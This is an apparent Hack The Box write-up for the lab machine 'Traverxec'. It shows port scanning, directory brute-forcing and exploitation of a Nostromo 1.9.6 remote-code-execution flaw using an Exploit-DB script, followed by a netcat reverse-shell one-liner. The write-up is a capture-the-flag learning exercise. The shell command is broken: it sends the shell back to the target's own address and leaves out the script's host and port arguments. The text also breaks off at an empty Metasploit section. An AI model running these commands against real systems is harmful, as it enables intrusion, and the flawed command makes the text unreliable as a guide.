---
title: "Traverxec"
subtitle: Hack The Box
excerpt: "Traverxec is an easy linux box that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user `david`. A bash script in the user's home directory reveals that the user can execute `journalctl` as root, which is exploited to spawn a `root` shell!"
header:
  image: /images/traverxec/traverxec_bio.png
  teaser: /images/traverxec/traverxec_bio.png
share_image: /images/traverxec/traverxec_bio.png
published: true
author_profile: true
tags:
  - Writeup
  - kali

sidebar:
  - title: "Traverxec"
    image: /images/traverxec/traverxec_bio.png
    image_alt: "Traverxec"
    text: "Hack The Box"
  - title: "Skills Learned"
    text: "SSH Key Cracking, GTFOBins"
  
---

# Overview

Traverxec is an easy linux box that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user `david`. A bash script in the user's home directory reveals that the user can execute `journalctl` as root, which is exploited to spawn a `root` shell!

# Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.165 | grep ^[0-9] | cut -d '/' -f
1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.165
```

![Initial NMAP](/images/traverxec/nmap.png)

Once the scan completes, it reveals ports 22 and 80 are open. NMAP also reports that the `http-server-header` is `nostromo 1.9.6`, which indicates the box is running the `Nostromo` HTTP server.

# Nostromo

![Nostromo](/images/traverxec/nostromo.png)

The webpage appears to be pretty empty, resulting in very little information at first look. So, we fire off a gobuster:

```bash
gobuster dir -u http://10.10.10.165 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -n
```

While we let gobuster run in the background, I look to Google. After a bit of digging, we find that Nostromo version 1.9.6 has a [Remote Code Execution](https://www.exploit-db.com/exploits/47837) vulnerability. Being that this exploit is found on Exploit-DB, that usually means there is a Metasploit module for it - which means we can "manually" exploit it or use Metasploit. I'll show both ways.

1. "Manual" exploitation.

First, we need to copy the exploit from exploit-db and inspect it:

```bash
searchsploit -m /multiple/remote/47837
```
---

![Exploit](/images/traverxec/payload.png)

### The heck is going on?

Interesting. We're exploiting the `http_verify` function in nostromo nhttpd. Which is allowing us remote code execution. Let's test it out:

```bash
python 47837.py 10.10.10.165 80 id
```

Ok, cool, we got a response. Lets setup a listener and try to get a shell:

```bash
nc -lvnp 9001
```

```bash
python 47837.py "nc -e bash 10.10.10.165 9001"
```

And........ We get a shell


# Metasploit


